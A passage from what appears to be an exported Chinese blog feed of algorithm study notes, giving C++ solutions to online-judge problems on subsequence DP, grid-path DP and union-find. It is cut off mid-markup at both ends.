style="margin-right:0.2777777777777778em;"></span></span></span></span>里，而当到达62的时候，在代码中我们进行判断时，便会记录来自未记录序列（假设是序列2）的方案数。</p>
<p>代码如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">5000</span>+<span class="number">5</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line">ll dp[N]=&#123;<span class="number">0</span>&#125;;<span class="comment">//记录以i结尾的序列的长度</span></span><br><span class="line">ll t[N];<span class="comment">//记录以i结尾的序列的方案数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//求最大降序列</span></span><br><span class="line">    <span class="keyword">int</span> n;<span class="comment">//股票发行天数</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    ll price[N];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;price[i]);<span class="comment">//股票价格</span></span><br><span class="line">    &#125;</span><br><span class="line">    ll MaxChance=<span class="number">0</span>;<span class="comment">//最大购买次数</span></span><br><span class="line">    ll num=<span class="number">0</span>;<span class="comment">//最大购买方案数</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        dp[i]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;i;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>((price[j]&gt;price[i])&amp;&amp;(dp[i]&lt;(dp[j]+<span class="number">1</span>)))</span><br><span class="line">            &#123;</span><br><span class="line">                dp[i]=dp[j]+<span class="number">1</span>;<span class="comment">//延续序列长度</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(dp[i]&gt;MaxChance) MaxChance=dp[i];<span class="comment">//记录最大长度</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;i;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>((dp[i]==dp[j])&amp;&amp;(price[i]==price[j]))</span><br><span class="line">            &#123;<span class="comment">//如果与前面的数列相同，则舍去前面的数列，防止重复计数</span></span><br><span class="line">                t[j]=<span class="number">0</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>((dp[i]==(dp[j]+<span class="number">1</span>))&amp;&amp;(price[i]&lt;price[j]))&#123;</span><br><span class="line">                <span class="comment">//说明序列i可由序列j得来</span></span><br><span class="line">                t[i]+=t[j];<span class="comment">//记录序列i的方案数</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!t[i])  t[i]=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//计算最大次数和方案数</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        <span class="keyword">if</span>(dp[i]==MaxChance)</span><br><span class="line">            num+=t[i];<span class="comment">//记录所有的最长序列的方案数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld %lld&quot;</span>,MaxChance,num);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="合唱队形"><a class="markdownIt-Anchor" href="#合唱队形"></a> 合唱队形</h4>
<p>题目链接：<a href="http://124.71.166.97:5880/contest/22/problem/P0210">oj | 合唱队形</a></p>
<p>题目给出一个序列，求出去掉最少人数后使得序列满足先升后降的大小关系。思路就是先从头开始得到一个最大上升子序列，再从尾开始得到一个最大上升子序列，这样的话就可以将二者合并得到最大的合唱队形人数，再用总的人数相减即可（中间的人<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>i</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;i\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>计算了两次）。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">100</span>+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> dp1[N],dp2[N];</span><br><span class="line"><span class="keyword">int</span> a[N];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);<span class="comment">//输入人数</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i+<span class="number">1</span>]);<span class="comment">//录入人数</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//首先正向求最大升序列</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        dp1[i]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;i;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[j]&lt;a[i])<span class="comment">//升</span></span><br><span class="line">                dp1[i]=<span class="built_in">max</span>(dp1[i],dp1[j]+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//接着逆向求最大升序列</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n;i&gt;=<span class="number">1</span>;i--)</span><br><span class="line">    &#123;</span><br><span class="line">        dp2[i]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=n;j&gt;i;j--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[j]&lt;a[i])</span><br><span class="line">                dp2[i]=<span class="built_in">max</span>(dp2[i],dp2[j]+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//接着合并求最大值</span></span><br><span class="line">    <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        <span class="keyword">if</span>(dp1[i]+dp2[i]&gt;count)</span><br><span class="line">            count=dp1[i]+dp2[i];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,n-count+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>算法记录-二维DP</title>
    <url>/2021/11/10/%E7%AE%97%E6%B3%95%E8%AE%B0%E5%BD%95-%E4%BA%8C%E7%BB%B4DP/</url>
    <content><![CDATA[<hr />
<h4 id="过河卒"><a class="markdownIt-Anchor" href="#过河卒"></a> 过河卒</h4>
<p>题目链接：<a href="http://124.71.166.97:5880/contest/22/problem/P0212">oj | 过河卒</a></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20211110125604.png" alt="过河卒" /></p>
<p>题目数据量很小，这题最开始做的时候没有考虑边界（<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>x</mi><mo>=</mo><mn>0</mn><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;x=0\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>或<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>y</mi><mo>=</mo><mn>0</mn><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;y=0\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>计算时会发生越界操作）。水题，做起来思路很容易，是二维DP的入门。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  ll long long</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">20</span>+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> dp[N][N]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> n,m,xma,yma;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d %d&quot;</span>,&amp;n,&amp;m,&amp;xma,&amp;yma);</span><br><span class="line">    <span class="comment">//初始化一些点</span></span><br><span class="line">    <span class="comment">//dp[0][0]=0;</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=m;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            dp[i][j]=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(((<span class="built_in">abs</span>(i-xma)==<span class="number">2</span>)&amp;&amp;(<span class="built_in">abs</span>(j-yma)==<span class="number">1</span>))||((<span class="built_in">abs</span>(i-xma)==<span class="number">1</span>)&amp;&amp;(<span class="built_in">abs</span>(j-yma)==<span class="number">2</span>)))</span><br><span class="line">            &#123;</span><br><span class="line">                dp[i][j]=<span class="number">0</span>;<span class="comment">//在马的控制点</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>((i==xma)&amp;&amp;(j==yma))</span><br><span class="line">            &#123;</span><br><span class="line">                dp[i][j]=<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>((i==<span class="number">0</span>)&amp;&amp;(j==<span class="number">0</span>))&#123;dp[i][j]=<span class="number">1</span>;&#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(i==<span class="number">0</span>) &#123;dp[i][j]=dp[i][j<span class="number">-1</span>];&#125;<span class="comment">//只能从左边来</span></span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(j==<span class="number">0</span>) &#123;dp[i][j]=dp[i<span class="number">-1</span>][j];&#125;<span class="comment">//只能从上边来</span></span><br><span class="line">                <span class="keyword">else</span>&#123;dp[i][j]=dp[i<span class="number">-1</span>][j]+dp[i][j<span class="number">-1</span>];&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,dp[n][m]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>算法记录-并查集</title>
    <url>/2021/11/17/%E7%AE%97%E6%B3%95%E8%AE%B0%E5%BD%95-%E5%B9%B6%E6%9F%A5%E9%9B%86/</url>
    <content><![CDATA[<hr />
<p>并查集就是将具有某一相同性质的数据存放在一个集合中，说起来有点类似于求连通子图的味道在里面。通常由一个整形数组<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>r</mi><mi>o</mi><mi>o</mi><mi>t</mi><mo stretchy="false">[</mo><mtext>  </mtext><mtext>  </mtext><mo stretchy="false">]</mo><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;root[\;\;]\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">o</span><span class="mord mathdefault">o</span><span class="mord mathdefault">t</span><span class="mopen">[</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>来记录我们结点的父结点，也就是作为我们集合的代表元，另外由两个函数<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>f</mi><mi>i</mi><mi>n</mi><mi>d</mi><mo stretchy="false">(</mo><mo stretchy="false">)</mo><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;find()\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>j</mi><mi>o</mi><mi>i</mi><mi>n</mi><mo stretchy="false">(</mo><mo stretchy="false">)</mo><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;join()\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault">o</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mopen">(</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>组成，其中前者用于查找其集合的代表元，后者用于合并两个结点到一个集合中。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//find函数实现(压缩路径):</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x==root[x]?x:root[x]=<span class="built_in">find</span>(root[x]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//join函数实现:</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">join</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fx=<span class="built_in">find</span>(x),fy=<span class="built_in">find</span>(y);</span><br><span class="line">    <span class="keyword">if</span>(fx==fy) <span class="keyword">return</span>;</span><br><span class="line">    root[fx]=fy;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>另外一些题目中会用到加权标记，也就是说可能会用到结点在集合中的深度，这是可以增加一个<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>R</mi><mi>a</mi><mi>n</mi><mi>k</mi><mo stretchy="false">[</mo><mtext>  </mtext><mtext>  </mtext><mo stretchy="false">]</mo><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;Rank[\;\;]\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mopen">[</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>数组用于记录结点的深度，初始化深度都为1，相应的合并算法可以如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//加权标记:</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">join</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fx=<span class="built_in">find</span>(x),fy=<span class="built_in">find</span>(y);</span><br><span class="line">    <span class="keyword">if</span>(fx==fy) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(rank[fx]&gt;rank[fy]) root[fy]=fx;</span><br><span class="line">    <span class="comment">//如果fx深度高于fy，则将fx作为fy的父节点</span></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(rank[fx]==rank[fy]) rank[fy]++;</span><br><span class="line">        root[fx]=fy;</span><br><span class="line">        <span class="comment">//反之，将fy作为fx的父节点，注意两者高度相同的情况</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr />
<h4 id="亲戚简单并查集实现"><a class="markdownIt-Anchor" href="#亲戚简单并查集实现"></a> 亲戚（简单并查集实现）</h4>
<p>链接：<a href="http://124.71.166.97:5880/contest/22/problem/P0300">oj | 亲戚</a></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20211117213754.png" alt="亲戚" /></p>
<p>最基础的并查集实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  ll long long</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">5000</span>+<span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> root[N];<span class="comment">//记录父节点，表示是否属于一个块内</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span><span class="comment">//寻找父节点</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root[x]==x) <span class="keyword">return</span> x;</span><br><span class="line">    <span class="keyword">return</span> root[x]=<span class="built_in">find</span>(root[x]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Join</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fx=<span class="built_in">find</span>(x),fy=<span class="built_in">find</span>(y);</span><br><span class="line">    <span class="keyword">if</span>(fx!=fy)</span><br><span class="line">    &#123;</span><br><span class="line">        root[fx]=fy;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m,p;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>,&amp;n,&amp;m,&amp;p);</span><br><span class="line">    <span class="comment">//先初始化父节点</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) root[i]=i;</span><br><span class="line">    <span class="comment">//合并关系</span></span><br><span class="line">    <span class="keyword">int</span> a,b;</span><br><span class="line">    <span class="keyword">while</span> (m--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">        <span class="built_in">Join</span>(a,b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (p--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">find</span>(a)==<span class="built_in">find</span>(b)) <span class="built_in">printf</span>(<span class="string">&quot;Yes\n&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;No\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="修复公路亲戚变体"><a class="markdownIt-Anchor" href="#修复公路亲戚变体"></a> 修复公路（亲戚变体）</h4>
<p>链接：<a href="http://124.71.166.97:5880/contest/22/problem/P0301">oj | 修复公路</a></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20211117214056.png" alt="修复公路" /></p>
<p>这里加入了一个条件–时间。区别于加权标记，这里的时间可以作为一个排序的标志，依次加入较短的路径看看能否构成连通图（即达成一个集合），有点迪杰斯特拉算法的味道。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hh</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> x,y,t;</span><br><span class="line">&#125;a[<span class="number">200000</span>];</span><br><span class="line"><span class="keyword">int</span> f[<span class="number">200000</span>],n,m;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">const</span> hh &amp;a,<span class="keyword">const</span> hh &amp;b)</span></span>&#123;<span class="keyword">return</span> a.t&lt;b.t;&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;<span class="keyword">return</span> f[x]==x?x:(f[x]=<span class="built_in">find</span>(f[x]));&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getin</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x=<span class="number">0</span>;<span class="keyword">char</span> ch=<span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">while</span>(ch&lt;<span class="string">&#x27;0&#x27;</span>||ch&gt;<span class="string">&#x27;9&#x27;</span>)ch=<span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">while</span>(ch&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;ch&lt;=<span class="string">&#x27;9&#x27;</span>)x=x*<span class="number">10</span>+ch<span class="number">-48</span>,ch=<span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    n=<span class="built_in">getin</span>(),m=<span class="built_in">getin</span>();</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>)&#123;cout&lt;&lt;<span class="number">0</span>;<span class="keyword">return</span> <span class="number">0</span>;&#125;<span class="comment">//其实并没有什么用的特判</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)a[i].x=<span class="built_in">getin</span>(),a[i].y=<span class="built_in">getin</span>(),a[i].t=<span class="built_in">getin</span>();</span><br><span class="line">    <span class="built_in">sort</span>(a+<span class="number">1</span>,a+m+<span class="number">1</span>,cmp);<span class="comment">//按照时间排序</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)f[i]=i;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> fx=<span class="built_in">find</span>(a[i].x),fy=<span class="built_in">find</span>(a[i].y);</span><br><span class="line">        <span class="keyword">if</span>(fx!=fy)f[fx]=fy,n--;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>)&#123;cout&lt;&lt;a[i].t;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;<span class="number">-1</span>&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="奶酪"><a class="markdownIt-Anchor" href="#奶酪"></a> 奶酪</h4>
<p>链接：<a href="http://124.71.166.97:5880/contest/22/problem/P0303">oj | 奶酪</a></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20211117214531.png" alt="奶酪" /></p>
<p>这里还是判断能否形成一个集合，不过合并过程中遍历我们输入的点进行合并，两两比较复杂度可以达到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;O(n^2)\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>了。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//并查集</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 0x3f3f3f3f</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line">ll r,h;</span><br><span class="line"><span class="keyword">int</span> fa[<span class="number">10010</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> fa[x]==x ? x:fa[x]=<span class="built_in">find</span>(fa[x]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fa[<span class="built_in">find</span>(x)]=<span class="built_in">find</span>(y);</span><br><span 